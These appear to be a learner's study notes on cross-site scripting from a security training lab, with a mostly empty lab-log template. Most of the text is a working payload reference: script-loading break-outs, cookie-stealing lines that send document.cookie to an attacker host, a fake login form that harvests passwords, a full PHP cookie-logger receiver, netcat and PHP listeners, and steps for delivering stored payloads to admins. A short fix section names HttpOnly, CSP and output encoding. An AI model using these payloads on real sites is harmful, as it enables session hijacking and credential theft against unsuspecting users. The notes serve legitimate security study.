# Cross-Site Scripting (XSS)

> Status: ✅ Complete
> Date started: 2026-10-26
> Date finished: 2026-10-26

## 1. Goal
Inject JavaScript that runs in another user's browser. Three types: **reflected** (in the response to a request), **stored** (saved server-side, hits every viewer), **DOM** (client-side JS sink).

## Detection & basic payloads
```html
<script>alert(window.origin)</script>       <!-- classic PoC (window.origin confirms context) -->
<img src=x onerror=alert(document.cookie)>   <!-- when <script> is filtered -->
<plaintext>                                   <!-- breaks page = injection point found -->
"><script>alert(1)</script>                   <!-- break out of an attribute first -->
```
Find the context (HTML body / attribute / JS / URL) → craft the break-out. Automate discovery with **XSStrike** (`xsstrike.py -u "http://t/?x=test"`).

## DOM manipulation (impact demo)
```html
<script>document.title='pwned'</script>
<script>document.getElementById('loginform').innerHTML='<form action=//ATTACKER>...'</script>  <!-- phishing/defacement -->
```

## Session hijacking via XSS (stored XSS → cookie theft)
Highest-impact XSS. Inject a script that exfils the victim's cookie to your server, then replay it:
```html
<script src="http://ATTACKER/s.js"></script>
<!-- s.js: new Image().src='http://ATTACKER/?c='+document.cookie; -->
```
- A simple logger on your side records the cookie (backend source not stored here).
- **Replay:** set the stolen `PHPSESSID` in your browser (DevTools → Storage → Cookies) → refresh → you're the victim.
- **Mitigation that kills this:** `HttpOnly` cookie flag (JS can't read it). Also CSP, output encoding.

## Discovery tooling & setup
```bash
python xsstrike.py -u "http://TARGET/index.php?task=test"   # automated XSS fuzzing on a parameter
sudo php -S 0.0.0.0:80       # host remote script / receiver for the victim to call back to
python3 -m http.server 80    # simplest callback receiver (see hits in the access log)
sudo nc -lvnp 80             # raw listener to confirm a callback fired
```
URL-encoded reflected test (drop straight into a param):
`?task=%3Cscript%3Ealert(document.cookie)%3C/script%3E`

## Remote-JS include — payload variants
Same goal (load attacker JS), different break-outs/filter bypasses. Cycle these to find what the sink accepts:
```html
<script src=http://ATTACKER/x></script>
'><script src=http://ATTACKER/x></script>      <!-- break out of a single-quoted attr -->
"><script src=http://ATTACKER/x></script>      <!-- break out of a double-quoted attr -->
<script>$.getScript("http://ATTACKER/x")</script>                      <!-- if jQuery present -->
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load",b);a.open("GET","//ATTACKER");a.send();</script>
```
Numbering each probe (`/1`, `/2`, `/3`) in your callback log tells you *which* field/break-out fired.

## Blind XSS
Payload fires on a page you never see (admin panel, moderation queue, support ticket, log viewer). You can't observe `alert()` — so the payload **must call back**. Use the remote-JS-include variants above pointed at your server; a hit in your log = the payload executed somewhere privileged. Typical injection points: name/username fields, contact forms, user-agent, comments awaiting moderation.

## Phishing via XSS (credential harvest)
Technique, not a drop-in payload. On a page that reflects a URL/image parameter into an `<img src>` (or similar), break out and inject a fake login form whose `action` points at your server, then remove the legit form so the victim only sees yours:
```js
document.getElementById('urlform').remove();   // hide the real input so the fake form is the only option
```
Delivery: the app's own "send to user / submit for review" feature (e.g. a `send.php`) mails your crafted URL to the victim; their submitted creds land in your receiver's log. Keep the injected form minimal (username + password + submit) so it blends in.

## Fix
Context-aware **output encoding** (HTML/attr/JS/URL), input validation, CSP, `HttpOnly`+`Secure` cookies, frameworks that auto-escape.

> Workflow: find the sink → confirm with `alert(window.origin)` → identify stored vs reflected (stored = far worse, hits everyone) → demo real impact with cookie theft. `HttpOnly` is the one flag that defuses cookie-stealing XSS.

## My notes / lab output
Filled in as I run these on lab targets.

## Full payload reference (source notes)
Complete XSS payload set — nothing trimmed. Standard testing payloads; swap `OUR_IP`/`ATTACKER` for your host.

**Testing / PoC payloads**
| Payload | Description |
|---|---|
| `<script>alert(window.origin)</script>` | Basic PoC (origin confirms context) |
| `<script>alert(document.cookie)</script>` | Show the cookie |
| `<plaintext>` | Breaks page render = injection point found |
| `<script>print()</script>` | Basic PoC (print dialog) |
| `<script>alert('pass')</script>` | Simple reflection test |
| `<img src="" onerror=alert(window.origin)>` | HTML-based XSS (when `<script>` filtered) |
| `<img src="" onerror=alert(document.cookie)>` | DOM attack via onerror |
| `?task=%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E` | URL-encoded reflected payload |
| `document.getElementById("todo").innerHTML = "<b>Next Task:</b> " + decodeURIComponent(task);` | Example DOM sink to look for in JS |

**DOM manipulation (impact demo)**
| Payload | Description |
|---|---|
| `<script>document.body.style.background = "#141d2b"</script>` | Change background color |
| `<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>` | Change background image |
| `<script>document.title = 'HackTheBox Academy'</script>` | Change page title |
| `<script>document.getElementsByTagName('body')[0].innerHTML = 'text'</script>` | Overwrite page body |
| `<script>document.getElementById('urlform').remove();</script>` | Remove an element (for phishing) |
| `<script src="http://OUR_IP/script.js"></script>` | Load a remote script |
| `<script>new Image().src='http://OUR_IP/index.php?c='+document.cookie</script>` | Send cookie to us |

**Tooling / servers**
| Command | Description |
|---|---|
| `python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test"` | Run XSStrike on a parameter |
| `sudo nc -lvnp 80` | Netcat listener |
| `sudo php -S 0.0.0.0:80` | PHP server (host remote script / receiver) |
| `python3 -m http.server 80` | Simple receiver (hits in access log) |

**Remote-JS include variants** (cycle to beat filters/break-outs)
| Payload | Description |
|---|---|
| `<script src=http://OUR_IP/1></script>` | Direct include |
| `'><script src=http://OUR_IP/2></script>` | Break out of single-quoted attr |
| `"><script src=http://OUR_IP/3></script>` | Break out of double-quoted attr |
| `javascript:eval('var a=document.createElement(\'script\');a.src=\'http://OUR_IP\';document.body.appendChild(a)')` | javascript: URI include |
| `<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//OUR_IP");a.send();</script>` | XHR eval loader |
| `<script>$.getScript("http://OUR_IP")</script>` | jQuery getScript loader |

**Phishing (login-form injection)**
| Payload | Description |
|---|---|
| `http://<ip>/phishing/index.php?url=http://OUR_IP/image.png'><script>alert('xss found')</script>` | Break out of an `<img src>` to confirm |
| `document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" value="Login"></form>');` | Inject a fake login form (creds → your server) |
| `document.getElementById('urlform').remove();` | Remove the real form so only the fake shows |
| visit `/phishing/send.php` | App feature that mails the crafted URL to the victim |

**Cookie stealer (session hijacking)** — standard module artifacts
```javascript
// exploit.js hosted on attacker:
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```
```php
// index.php receiver (writes cookies.txt):
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```
Delivery: inject `"><script src=http://OUR_IP/exploit.js></script>` in a stored field (e.g. an `imgurl=` parameter / registration awaiting admin review) → admin views it → cookie lands in `cookies.txt` → set the stolen cookie in your browser at `/login.php`. **Mitigation that kills it: `HttpOnly` cookie flag** (+ CSP, output encoding).

Reference: PayloadsAllTheThings — XSS Injection.

## 2. Setup
- Attack box: (Pwnbox / Kali VM)
- Target(s): `<TARGET_IP>` (placeholders only, no real lab IPs)

## 3. Commands I used
Each block says which machine it ran on.

```bash
# [ATTACK BOX]

```

```bash
# [TARGET]

```

## 4. Confirmed (what worked)
- 

## 5. Tried, didn't work (and why)
- 

## 6. Open questions / revisit
- 

## 7. Cheat sheet lines
Copied into `cheatsheets/`:
- 
